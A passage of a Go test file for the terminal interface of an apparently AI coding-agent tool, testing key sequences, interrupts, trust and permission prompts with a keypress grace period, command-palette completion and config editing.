		{"ctrl+c drops a held prefix", false, false, false, false, "abc", []tea.KeyPressMsg{ctrlE, ctrlC}, false, false, "", ""},
		{"interrupt dismisses a parked question ask", true, false, false, true, "", nil, true, false, "also this", "ctrl+c quit"},
	} {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			app, host := bootAgentApp(t, 90, 16)
			clock := time.UnixMilli(1000)
			agentID := store.ShortID()
			app.now = func() time.Time { return clock }
			runLua(t, app, `zemi.keymap.set("ctrl+e s", "zemi.ui.help")`)
			testStore(t, host)
			var stopped chan struct{}
			if c.busy {
				stopped = make(chan struct{})
				done := host.Busy("signing in", func() { close(stopped) })
				defer done()
			}
			if c.active {
				host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: time.Second})
				if err := host.AgentSend("also this"); err != nil {
					t.Fatal(err)
				}
			}
			var qdone chan questionResult
			if c.quest {
				qdone = askAsync(t, app, tools.Question{Type: tools.TypeSingle, Question: "Proceed?", Options: []tools.QuestionOption{{Label: "yes"}}})
			}
			if c.view {
				clock = clock.Add(time.Hour)
				if err := host.DB.CreateSession(agentID, store.ShortID(), "run", "explore"); err != nil {
					t.Fatal(err)
				}
			}
			app.composer.text = c.draft
			for _, k := range c.keys {
				switch k {
				case view:
					if err := host.ViewAgent(agentID); err != nil {
						t.Fatal(err)
					}
				case stop:
					host.SeedStream(hostapi.StreamSnapshot{})
				case box:
					runLua(t, app, `zemi.ui.input({ prompt = "Pick" }, function() end)`)
				default:
					app.Update(k)
				}
			}
			for app.Pump() {
			}
			if c.quest {
				// choosePerm's "No, and tell zemi" reaches interrupt with the
				// ask still up; the parked tool goroutine must be released
				app.interrupt()
				if r := awaitAnswer(t, app, qdone); r.ok || len(r.answers) != 0 {
					t.Fatalf("interrupt left the question ask: %+v ok=%v", r.answers, r.ok)
				}
			}
			if c.busy {
				select {
				case <-stopped:
				default:
					t.Fatal("esc esc did not cancel the busy job")
				}
			}
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			if app.cancelling != c.cancel || app.composer.text != c.composer || !strings.Contains(frame, c.row) || host.ViewedAgent() != "" || app.isArmed("ctrl+c") != c.armed || len(app.keySeq) > 0 || len(app.overlays) > 0 {
				t.Fatalf("cancelling=%v composer=%q view=%q overlays=%d frame:\n%s", app.cancelling, app.composer.text, host.ViewedAgent(), len(app.overlays), frame)
			}
		})
	}
}

// TestAgentViewEscRestoresItsMenus: esc on a shown run restores the menu the
// view was raised from under the screen the back command reopens, so h walks
// back down the chain the view closed.
func TestAgentViewEscRestoresItsMenus(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 90, 16)
	testStore(t, host)
	open := func(id string) *hostapi.Command {
		return &hostapi.Command{Name: id, GoFn: func(h *hostapi.Host, _ string, confirm bool) error {
			ui, err := h.Screen()
			if err != nil {
				return err
			}
			ui.OpenOverlay(hostapi.Overlay{ID: id, Title: id, Origin: lua.OriginBuiltin, Items: []hostapi.OverlayItem{{Text: "a row"}}})
			return nil
		}}
	}
	if _, err := host.Commands.Add(open("wmenu")); err != nil {
		t.Fatal(err)
	}
	if _, err := host.Commands.Add(open("backscreen")); err != nil {
		t.Fatal(err)
	}
	agentID := store.ShortID()
	if err := host.DB.CreateSession(agentID, store.ShortID(), "run", "explore"); err != nil {
		t.Fatal(err)
	}
	if err := host.ViewAgentFrom(agentID, "backscreen", "wmenu"); err != nil {
		t.Fatal(err)
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	for app.Pump() {
	}
	if host.ViewedAgent() != "" {
		t.Fatal("esc left the run on screen")
	}
	var ids []string
	for _, st := range app.overlays {
		ids = append(ids, st.o.ID)
	}
	if !slices.Equal(ids, []string{"wmenu", "backscreen"}) {
		t.Fatalf("overlays %v, want the menu restored under the back screen", ids)
	}
}

// runLua runs src as user config and delivers the hooks it posted.
func runLua(t *testing.T, app *App, src string) {
	t.Helper()
	if err := app.host.RT.ExecuteChunk(t.Context(), src, "test.lua", lua.OriginUser); err != nil {
		t.Fatal(err)
	}
	for app.Pump() {
	}
}

// lastToast delivers queued hooks and returns the newest toast's body.
func lastToast(app *App) string {
	for app.Pump() {
	}
	if len(app.toasts) == 0 {
		return ""
	}
	return app.toasts[len(app.toasts)-1].body
}

// TestPaletteArgumentCompletion: past "/name " the palette lists the
// command's argument candidates, tab fills the argument under the cursor,
// enter runs the command with the highlighted one once the user moved to it
// and a bare "/name " as typed.
func TestPaletteArgumentCompletion(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 80, 20)
	ran := ""
	host.Commands.Add(&hostapi.Command{
		Name: "greet", NArgs: "?", GoFn: func(_ *hostapi.Host, args string, confirm bool) error { ran = args; return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return []string{"alice", "bob"} },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	host.Commands.Add(&hostapi.Command{
		Name: "quiet", GoFn: func(*hostapi.Host, string, bool) error { return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return []string{"loud"} },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	many := make([]string, 0, 60)
	for i := range 60 {
		many = append(many, "x"+strconv.Itoa(i))
	}
	host.Commands.Add(&hostapi.Command{
		Name: "many", NArgs: "*", GoFn: func(*hostapi.Host, string, bool) error { return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return append(many, "zed") },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	for _, c := range []struct{ keys, text, args string }{
		{"/greet b", "/greet b", "bob"},
		{"/greet b\t", "/greet bob ", ""}, // nargs "?" takes no second argument
		{"/gr\t", "/greet ", "alice bob"}, // an accepted name lists its arguments at once
		{"/quiet ", "/quiet ", ""},        // nargs "" takes no argument at all
		{"/many z", "/many z", "zed"},     // past the cap of 50
	} {
		app.clearComposer()
		for _, k := range c.keys {
			if k == '\t' {
				app.Update(tea.KeyPressMsg{Code: tea.KeyTab})
			} else {
				app.Update(tea.KeyPressMsg{Code: k, Text: string(k)})
			}
		}
		var args []string
		for _, a := range app.palette.args {
			args = append(args, a.label)
		}
		if app.composer.text != c.text || strings.Join(args, " ") != c.args || app.palette.open != (c.args != "") || len(app.palette.matches) != 0 {
			t.Errorf("%q: composer %q, args %v (open=%v, matches %d), want %q and %q", c.keys, app.composer.text, args, app.palette.open, len(app.palette.matches), c.text, c.args)
		}
	}
	for _, c := range []struct {
		keys []tea.KeyPressMsg
		want string
	}{
		{nil, ""},
		{[]tea.KeyPressMsg{{Code: tea.KeyDown}}, "bob"},
	} {
		app.clearComposer()
		ran = "-"
		for _, k := range "/greet " {
			app.Update(tea.KeyPressMsg{Code: k, Text: string(k)})
		}
		for _, k := range append(c.keys, tea.KeyPressMsg{Code: tea.KeyEnter}) {
			app.Update(k)
		}
		if ran != c.want {
			t.Fatalf("%v enter ran /greet %q, want %q", c.keys, ran, c.want)
		}
	}
}

// TestTrustAnswers: the cursor starts on Later, so enter, esc and ctrl+c
// trust nothing; trusting takes y, moving to its row or a click on it.
func TestTrustAnswers(t *testing.T) {
	t.Parallel()
	click := func(label string) func(*App) {
		return func(app *App) {
			app.renderSync(t)
			x, y := findCell(t, app, label)
			clickAt(app, x+1, y)
		}
	}
	key := func(k tea.KeyPressMsg) func(*App) { return func(app *App) { app.Update(k) } }
	for _, c := range []struct {
		name, want string
		do         func(*App)
	}{
		{"y", "trust", key(tea.KeyPressMsg{Code: 'y', Text: "y"})},
		{"n", "untrust", key(tea.KeyPressMsg{Code: 'n', Text: "n"})},
		{"esc", "later", key(tea.KeyPressMsg{Code: tea.KeyEscape})},
		{"enter", "later", key(tea.KeyPressMsg{Code: tea.KeyEnter})},
		{"up enter", "untrust", func(app *App) { pressKeys(app, "k", "enter") }},
		{"ctrl+c", "later", key(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})},
		{"d", "", key(tea.KeyPressMsg{Code: 'd', Text: "d"})},
		{"click on Trust", "trust", click("Trust  ")},
		{"click on Don't trust", "untrust", click("Don't trust")},
		{"click on the path", "", click("/proj")},
	} {
		app, _ := bootAgentApp(t, 80, 24)
		done := make(chan string, 1)
		go func() { done <- app.AskTrust("/proj", "/proj", "") }()
		waitPrompt(t, app, func() bool { return app.trust != nil })
		c.do(app)
		if c.want == "" {
			if app.trust == nil || len(done) != 0 {
				t.Errorf("%s answered the prompt", c.name)
			}
			app.answerTrust("later") // the case leaves the box open: let its asker go
			continue
		}
		if got := <-done; got != c.want {
			t.Errorf("%s answered %q, want %q", c.name, got, c.want)
		}
	}
}

// TestTrustAnswerKeyDoesNotReachTheNextBox: the key that answers the trust
// prompt is dead to the box a boot opens right after it (the model picker a
// first run lands on), so one y cannot both trust and copy a key row.
func TestTrustAnswerKeyDoesNotReachTheNextBox(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 24)
	done := make(chan string, 1)
	go func() { done <- app.AskTrust("/proj", "/proj", "") }()
	waitPrompt(t, app, func() bool { return app.trust != nil })
	pressKeys(app, "y")
	if got := <-done; got != "trust" {
		t.Fatalf("trust answered %q", got)
	}
	app.openOverlay(hostapi.Overlay{
		ID: "model", Origin: lua.OriginBuiltin,
		Items: []hostapi.OverlayItem{{Text: "export ANTHROPIC_API_KEY=", Copy: "export ANTHROPIC_API_KEY="}},
	})
	pressKeys(app, "y")
	for app.Pump() {
	}
	if len(app.toasts) != 0 {
		t.Fatalf("the answer's key reached the picker: %+v", app.toasts)
	}
	pressKeys(app, "y")
	for app.Pump() {
	}
	if len(app.toasts) == 0 {
		t.Fatal("the picker's copy died with the guard")
	}
}

// TestGoldenTrustPrompt pins the trust prompt at boot, started below the
// repository root, as /trust shows it with the current decision, and
// started outside the root with too little room, where the text scrolls.
func TestGoldenTrustPrompt(t *testing.T) {
	for _, c := range []struct {
		name, cwd, state string
		w, h             int
	}{
		{"boot", "/code/acme/services/api", "", 80, 24},
		{"command", "/code/acme", "trusted", 80, 24},
		{"worktree on a short screen", "/code/acme-wt", "", 60, 16},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentAppPinned(t, c.w, c.h)
			go app.AskTrust("/code/acme", c.cwd, c.state)
			waitPrompt(t, app, func() bool { return app.trust != nil })
			app.renderSync(t)
			golden.RequireEqual(t, app.Frame())
			if app.Update(tea.KeyPressMsg{Code: tea.KeyPgDown}); app.trust.view.overflows() != (app.trust.view.top > 0) {
				t.Fatalf("pgdown moved the text to %d of %d rows", app.trust.view.top, app.trust.view.rows)
			}
			app.answerTrust("later")
		})
	}
}

// TestPromptKeyGrace: a key pressed within permGrace of a prompt opening
// is ignored, so typing cannot answer it; a later key answers.
func TestPromptKeyGrace(t *testing.T) {
	t.Parallel()
	for _, c := range []struct {
		name, want string
		ask        func(app *App) string
		open       func(app *App) bool
	}{
		{"trust", "trust", func(app *App) string { return app.AskTrust("/proj", "/proj", "") }, func(app *App) bool { return app.trust != nil }},
		{"perm", "user:once", func(app *App) string {
			_, by := app.AskPermission(hostapi.PermRequest{Subject: "tool.shell", Arg: "make deploy"})
			return by
		}, func(app *App) bool { return app.permAsk != nil }},
	} {
		app, _ := bootAgentApp(t, 80, 20)
		done := make(chan string, 1)
		go func() { done <- c.ask(app) }()
		waitPrompt(t, app, func() bool { return c.open(app) })
		// the grace only applies with a program attached; set it after the
		// prompt opened so the ask still ran inline
		app.program = tea.NewProgram(nil)
		opened := app.now()
		app.now = func() time.Time { return opened.Add(_permGrace / 4) }
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		if !c.open(app) || len(done) != 0 {
			t.Fatalf("%s: a key inside the grace answered the prompt", c.name)
		}
		app.now = func() time.Time { return opened.Add(_permGrace + time.Millisecond) }
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		if got := <-done; got != c.want {
			t.Errorf("%s answered %q after the grace", c.name, got)
		}
	}
}

// TestAskGuardUnderDraft: the guard all four blocking asks share - keys
// still in flight as the box opened are swallowed, past the grace the ask
// answers with a draft under it untouched, and once it closes the composer
// takes the keys back and submits the kept draft.
func TestAskGuardUnderDraft(t *testing.T) {
	t.Parallel()
	for _, c := range []struct {
		name   string
		ask    func(app *App)
		open   func(app *App) bool
		answer string // the key that answers the ask
	}{
		{
			"plan", func(app *App) { app.AskPlan("# Plan") },
			func(app *App) bool { return app.planAsk != nil }, "a",
		},
		{"question", func(app *App) {
			app.AskQuestion([]tools.Question{{Type: tools.TypeSingle, Question: "go on?", Options: []tools.QuestionOption{{Label: "one"}}}})
		}, func(app *App) bool { return app.question != nil }, "1"},
		{
			"trust", func(app *App) { app.AskTrust("/proj", "/proj", "") },
			func(app *App) bool { return app.trust != nil }, "y",
		},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentApp(t, 80, 20)
			done := make(chan struct{})
			go func() { c.ask(app); close(done) }()
			waitPrompt(t, app, func() bool { return c.open(app) })
			// the grace only applies with a program attached; set it after
			// the prompt opened so the ask still ran inline
			app.program = tea.NewProgram(nil)
			app.composer.text, app.composer.cursor = "do ", 3 // typing as the box opened
			opened := app.now()
			now := opened
			app.now = func() time.Time { return now }
			typeKey := func(key string) {
				now = now.Add(time.Millisecond)
				app.Update(tea.KeyPressMsg{Code: rune(key[0]), Text: key})
			}
			now = opened.Add(_permGrace / 4)
			typeKey("x")
			if !c.open(app) || app.composer.text != "do " {
				t.Fatalf("a key inside the grace answered or drafted: open=%v text=%q", c.open(app), app.composer.text)
			}
			now = opened.Add(_permGrace + time.Millisecond)
			typeKey(c.answer)
			select {
			case <-done:
			case <-time.After(2 * time.Second):
				t.Fatal("the ask did not answer past the grace")
			}
			if app.composer.text != "do " {
				t.Fatalf("answering the ask moved the draft: %q", app.composer.text)
			}
			typeKey("x") // the box is gone: the draft edits again
			if app.composer.text != "do x" {
				t.Fatalf("the composer did not take the keys back: %q", app.composer.text)
			}
			app.composerKey("enter", tea.KeyPressMsg{}) // no model: the send fails, the text is kept
			if len(app.composer.history) != 1 || app.composer.history[0] != "do x" {
				t.Fatalf("the draft did not submit: history %v", app.composer.history)
			}
		})
	}
}

// TestPermissionProseTypesUnderTheAsk: past the grace an ask's keys answer
// even under a draft — the ask owns its keys — while letters it does not
// use type into the draft the box keeps, and enter answers the highlighted
// choice.
func TestPermissionProseTypesUnderTheAsk(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 20)
	done := make(chan struct{})
	var allowed bool
	go func() {
		allowed, _ = app.AskPermission(hostapi.PermRequest{Subject: "tool.shell", Arg: "make deploy"})
		close(done)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })
	app.program = tea.NewProgram(nil)
	opened := app.now()
	now := opened
	app.now = func() time.Time { return now }
	typeKey := func(key string) {
		now = now.Add(time.Millisecond)
		app.Update(tea.KeyPressMsg{Code: rune(key[0]), Text: key})
	}
	now = opened.Add(_permGrace + time.Millisecond)
	typeKey("hold a ladder") // letters the ask spares draft whole
	if app.permAsk == nil || app.composer.text != "hold a ladder" {
		t.Fatalf("prose under the ask must draft whole: ask=%v text=%q", app.permAsk != nil, app.composer.text)
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // enter answers the highlighted `No`
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("enter under a draft must answer the ask")
	}
	if allowed {
		t.Fatal("enter picked the highlighted No")
	}
	if app.composer.text != "hold a ladder" {
		t.Fatalf("the draft must survive the answer: %q", app.composer.text)
	}
}

// TestFoldedKeyKeepsItsCase: a folded esc+capital replays both keys with the
// capital's case, and a plain capital types itself — no esc rides it, no
// case is lost.
func TestFoldedKeyKeepsItsCase(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 20)
	app.Update(tea.KeyPressMsg{Code: 'd', Mod: tea.ModShift, Text: "D"})
	if got := app.composer.text; got != "D" {
		t.Fatalf("a plain capital must type itself: %q", got)
	}
	app.Update(tea.KeyPressMsg{Code: 'p', Mod: tea.ModAlt | tea.ModShift, Text: "P"})
	if got := app.composer.text; got != "DP" {
		t.Fatalf("a folded esc+capital replays the key's case: %q", got)
	}
	app.Update(tea.KeyPressMsg{Code: 'p', Mod: tea.ModAlt, Text: "p"})
	if got := app.composer.text; got != "DPp" {
		t.Fatalf("a folded esc+lower replays it: %q", got)
	}
	app.composer.text, app.composer.cursor = "word one two", len("word one two")
	app.Update(tea.KeyPressMsg{Code: 'w', Mod: tea.ModAlt | tea.ModCtrl})
	if got := app.composer.text; got != "word one " {
		t.Fatalf("a folded esc+ctrl+w keeps the ctrl binding: %q", got)
	}
	app.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModAlt | tea.ModCtrl})
	if got := app.composer.text; strings.HasSuffix(got, "c") {
		t.Fatalf("a folded esc+ctrl+c must not type its letter: %q", got)
	}
}

// TestNoopKeysBumpNothing: a key or a wheel that moves nothing under the
// chrome leaves the frame generation alone, so it never re-renders widgets;
// ones that move something still bump.
func TestNoopKeysBumpNothing(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 20)
	done := make(chan string, 1)
	go func() { done <- app.AskTrust("/proj", "/proj", "") }()
	waitPrompt(t, app, func() bool { return app.trust != nil })
	app.program = tea.NewProgram(nil)
	app.now = func() time.Time { return app.trust.opened.Add(_permGrace + time.Millisecond) }
	gen := app.frameGen
	app.Update(tea.KeyPressMsg{Code: 'x', Text: "x"})
	if app.frameGen != gen {
		t.Fatal("a no-op key under the trust box bumped the frame")
	}
	app.trust.view.top = 0
	app.Update(tea.MouseWheelMsg{Button: tea.MouseWheelUp, X: 40, Y: app.chromeRect.Min.Y + 2})
	if app.frameGen != gen || app.trust.view.top != 0 {
		t.Fatal("a wheel at the top of the box text bumped the frame")
	}
	app.Update(tea.KeyPressMsg{Code: 'j', Text: "j"})
	if app.frameGen != gen+1 {
		t.Fatalf("a move under the box did not bump the frame: %d of %d", app.frameGen, gen)
	}
	// the clock this test pinned reads the box, so put it back first
	app.now = func() time.Time { return time.UnixMilli(500) }
	app.answerTrust("later")
	if got := <-done; got != "later" {
		t.Fatalf("the box answered %q, want later", got)
	}
}

// thoughtHead is the line carrying the live thinking mark, "" for a frame
// without one.
func thoughtHead(frame string) string {
	for l := range strings.SplitSeq(frame, "\n") {
		if strings.HasSuffix(strings.TrimRight(l, " \r"), " thinking") {
			return l
		}
	}
	return ""
}

// spinOf splits the mark's spinner glyph off a thought head, which stands at
// column 2 behind the bar.
func spinOf(head string) (mark, rest string) {
	if r := []rune(head); len(r) > 2 {
		return string(r[2]), string(r[:2]) + string(r[3:])
	}
	return "", head
}

// TestReasoningSpinsBehindModal: the backdrop of an open box keeps its
// effects, so the live mark keeps stepping and the tick stays on the frame
// clock while the box waits for the reader.
func TestReasoningSpinsBehindModal(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 80, 16)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Reasoning: "one\n", Thinking: true})
	app.openOverlay(hostapi.Overlay{ID: "usage", Title: "Usage", Body: "x"})
	render := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		return ansi.Strip(app.Frame())
	}
	a, b := render(500), render(750)
	spinA, _ := spinOf(thoughtHead(a))
	spinB, _ := spinOf(thoughtHead(b))
	if spinA == "" || spinA == spinB {
		t.Fatalf("the live mark froze behind a box:\n%s", a)
	}
	if !app.spun || app.tickInterval() != _frameInterval {
		t.Fatalf("a spinner behind a box ticks %v (spun %v)", app.tickInterval(), app.spun)
	}
}

// TestWorkingRowRetryNarrow: a rule too narrow for everything keeps the
// retry's reason and countdown before the key hint and the clock, and a long
// reason narrows, never starves the rule of any state at all.
func TestWorkingRowRetryNarrow(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		name string
		why  string
		want string
	}{
		{"short reason fits whole", "rate limited by the provider", "next try in 45s · rate limited by the provider"},
		{"a long reason narrows", "network: the connection dropped mid-reply", "next try in 45s · network: the connection"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			app, host := bootAgentApp(t, 60, 16)
			host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 14 * time.Second, Retrying: true, RetryIn: 45 * time.Second, Retries: 1, RetryWhy: tc.why})
			app.renderSync(t)
			row := ansi.Strip(app.renderSegs(app.widgetLines("working")[0], 60))
			if !strings.Contains(row, tc.want) {
				t.Fatalf("the narrow rule lost the reason: %q", row)
			}
			if strings.Contains(row, "esc interrupt") {
				t.Fatalf("the narrow rule kept the key hint over the reason: %q", row)
			}
		})
	}
}

// TestWorkingRowMascot: the snail stays in the left corner on a plain rule
// and its shell spins while the agent works.
func TestWorkingRowMascot(t *testing.T) {
	t.Parallel()
	for _, r := range "@·.─⠋⠦" { // the rule's arithmetic counts one cell each
		if ansi.StringWidth(string(r)) != 1 {
			t.Fatalf("%q is not one cell wide", r)
		}
	}
	app, host := bootAgentApp(t, 80, 16)
	row := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		segs := app.widgetLines("working")[0]
		if w := hostapi.SegsWidth(segs); w != 78 {
			t.Fatalf("the rule is %d cells, want 78", w)
		}
		return ansi.Strip(app.renderSegs(segs, 80))
	}
	// idle is the snail and a plain rule, whatever the frame
	want := " @·· " + strings.Repeat("─", 73)
	if a, b := row(0), row(7000); a != want || b != want {
		t.Fatalf("idle rule moved: %q then %q", a, b)
	}
	// working spins the shell from the first frame, the eyes still
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	if a, b := row(0), row(300); !strings.HasPrefix(a, " ⠋·· ─") || !strings.HasPrefix(b, " ⠦·· ─") {
		t.Fatalf("the working snail does not spin: %q then %q", a, b)
	}
	// a long command spins the same
	long := []hostapi.StreamTool{{Name: "shell", Status: "run", Started: time.Now().Add(-time.Minute)}}
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: long})
	if a, b := row(0), row(300); !strings.HasPrefix(a, " ⠋·· ─") || !strings.HasPrefix(b, " ⠦·· ─") {
		t.Fatalf("a long command stops the spinner: %q then %q", a, b)
	}
	// the block ends a cell off the rule: its right end stays put whatever the
	// clock reads, the digits it gains eating into the rule on its left
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 5 * time.Second})
	short := row(500)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 605 * time.Second})
	r := row(500)
	if at := strings.Index(r, " esc interrupt · 10m 05s"); at <= len(r)/2 {
		t.Fatalf("the status does not end the rule: %q", r)
	}
	if !strings.HasSuffix(short, "esc interrupt · 5s ") || !strings.HasSuffix(r, "esc interrupt · 10m 05s ") {
		t.Fatalf("the block does not end the rule as the clock reads: %q then %q", short, r)
	}
	// the open prompt says what answers it, so the rule shrinks to the snail
	// alone: no esc, which the prompt takes
	app.permAsk = &permAskPrompt{req: hostapi.PermRequest{Subject: "tool.shell", Arg: "make"}}
	if r := row(1000); r != " ⠋·· "+strings.Repeat("─", 73) {
		t.Fatalf("the rule does not shrink while the user is asked: %q", r)
	}
	app.permAsk = nil
	// a turn's end bows the snail back to idle, however it ended
	for _, msg := range []turnDoneMsg{{}, {err: "boom"}, {stopped: true}} {
		// the host can still read active a frame after the turn reported
		host.SeedStream(hostapi.StreamSnapshot{Active: true})
		app.AgentStream()
		app.Update(msg)
		app.Update(frameTickMsg{})
		host.SeedStream(hostapi.StreamSnapshot{})
		app.Update(frameTickMsg{})
		if r := row(2500); !strings.HasPrefix(r, " @·· ─") {
			t.Fatalf("after %+v the snail does not bow idle: %q", msg, r)
		}
	}
	// a narrow rule drops the clock before the interrupt key
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	app.Update(tea.WindowSizeMsg{Width: 26, Height: 16})
	app.renderSync(t)
	if r := ansi.Strip(app.renderSegs(app.widgetLines("working")[0], 24)); !strings.Contains(r, "esc interrupt") || strings.Contains(r, "20s") {
		t.Fatalf("the narrow rule lost the interrupt key: %q", r)
	}
}

// TestLuaInput drives zemi.ui.input: typing edits the prefilled line, enter
// hands the text to on_confirm, esc hands it nil.
func TestLuaInput(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 20)
	open := `zemi.ui.input({ prompt = "Branch", default = "fix-" }, function(t) zemi.notify({ title = "input", body = t or "none" }) end)`

	runLua(t, app, open)
	if len(app.overlays) != 1 || app.overlays[0].o.Title != "Branch" {
		t.Fatalf("input overlay: %+v", app.overlays)
	}
	for _, r := range "lsp" {
		app.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lastToast(app); got != "fix-lsp" {
		t.Fatalf("enter gave %q", got)
	}
	runLua(t, app, open)
	app.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if got := lastToast(app); got != "none" || len(app.overlays) != 0 {
		t.Fatalf("esc gave %q, overlays %d", got, len(app.overlays))
	}
}

// TestConfigEdit: /config edit prompts with the key's value; enter sets it
// and leaves /config open, its row rebuilt, and a refused value keeps the
// prompt open with the error it named, the value unchanged.
func TestConfigEdit(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 80, 20)
	reloadUI(t, host)
	for _, c := range []struct {
		path, section, prefill, typed, desc, toast string
	}{
		{"editor.command", "editor", "", "vim", "this run  vim", ""},
		{"agent.max_background", "agent", "4", "x", "default   4", "agent.max_background is a number"},
	} {
		app.runCommand("config", "", false)
		app.runCommand("config", "edit "+c.path, false)
		for app.Pump() {
		}
		if st := app.overlays[len(app.overlays)-1]; !st.o.Input || st.input.text != c.prefill {
			t.Fatalf("%s: prompt %+v, text %q", c.path, st.o, st.input.text)
		}
		for _, r := range c.typed {
			app.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
		}
		app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
		toast := lastToast(app)
		n := len(app.overlays)
		if c.toast == "" { // a good value closes back onto /config
			if n != 1 || app.overlays[0].o.ID != "config" {
				t.Fatalf("%s: overlays after enter: %d", c.path, n)
			}
			app.runCommand("config", c.section, false)
			for app.Pump() {
			}
			items := app.overlays[len(app.overlays)-1].o.Items
			i := slices.IndexFunc(items, func(it hostapi.OverlayItem) bool { return it.Text == c.path })
			if i < 0 || items[i].Desc != c.desc {
				t.Errorf("%s: row %+v, desc want %q", c.path, items, c.desc)
			}
			app.cancelOverlay(app.overlays[len(app.overlays)-1].o)
			app.cancelOverlay(app.overlays[0].o)
			continue
		}
		// a refused value stays in the prompt with the error it named
		st := app.overlays[n-1]
		if n != 2 || !st.o.Input || st.inputErr == "" || !strings.Contains(st.inputErr, c.toast) {
			t.Fatalf("%s: overlays %d, prompt error %q", c.path, n, st.inputErr)
		}
		if toast != "" {
			t.Errorf("%s: toast %q, want none with the error in the box", c.path, toast)
		}
		app.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
		if err := app.overlays[n-1].inputErr; err != "" {
			t.Errorf("%s: typing did not clear the error %q", c.path, err)
		}
		app.cancelOverlay(st.o)
	}
}

// TestConfigEditErrorStays: a refused value wraps inside the width the box
// opened at, so the frame never jumps sideways, and the ghost of an empty
// line names what a bare enter would set.
func TestConfigEditErrorStays(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 80, 20)
	reloadUI(t, host)
	app.runCommand("config", "", false)
	app.runCommand("config", "edit session.recap", false)
	for app.Pump() {
	}
	for range 12 {
		app.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	}
	app.Frame() // the box draws and keeps its width
	before := app.overlays[len(app.overlays)-1].size
	// the cursor block sits on the ghost's first cell, so its escape splits the word
	if !strings.Contains(app.Frame(), "efault 3m") {
		t.Fatal("the emptied line shows no ghost")
	}
	app.Update(tea.KeyPressMsg{Code: 'x', Text: "x"}) // typing takes the line back
	if strings.Contains(app.Frame(), "efault 3m") {
		t.Fatal("the ghost outlived the first key")
	}
	for range 2 {
		app.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	}
	for _, r := range "soon" {
		app.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if err := app.overlays[len(app.overlays)-1].inputErr; err == "" {
		t.Fatal("the refused value named no error")
	}
	frame := app.Frame()
	if got := app.overlays[len(app.overlays)-1].size; got.w != before.w {
		t.Fatalf("the box widened %+v from %+v on the error", got, before)
	}
	// the message wraps to the box's rows: its tail is on a line of its own
	// and no drawn line carries the whole message
	lines := strings.Split(frame, "\n")
	for _, line := range lines {
		if strings.Contains(line, "duration like 90s or 3m") && strings.Contains(line, `not "soon"`) {
			t.Fatal("the error drew unwrapped")
		}
	}
	if !slices.ContainsFunc(lines, func(l string) bool { return strings.Contains(l, `"soon"`) }) {
		t.Fatal("the error's tail is not drawn")
	}
}

// TestKeySequence: ctrl+x then t runs a <leader>t binding without typing
// the t; a key that breaks the sequence reaches the composer.
func TestKeySequence(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 20)
	runLua(t, app, `zemi.keymap.set("<leader>t", function() zemi.notify({ title = "seq", body = "ran" }) end)`)
	leader := tea.KeyPressMsg{Code: 'x', Mod: tea.ModCtrl}
	app.Update(leader)
	if len(app.keySeq) != 1 {
		t.Fatalf("pending = %v", app.keySeq)
	}
	app.Update(tea.KeyPressMsg{Code: 't', Text: "t"})
	if lastToast(app) != "ran" || app.composer.text != "" {
		t.Fatalf("toasts=%v composer=%q", app.toasts, app.composer.text)
	}
	app.Update(leader)
	app.Update(tea.KeyPressMsg{Code: 'b', Text: "b"})
	if len(app.keySeq) != 0 || app.composer.text != "b" {
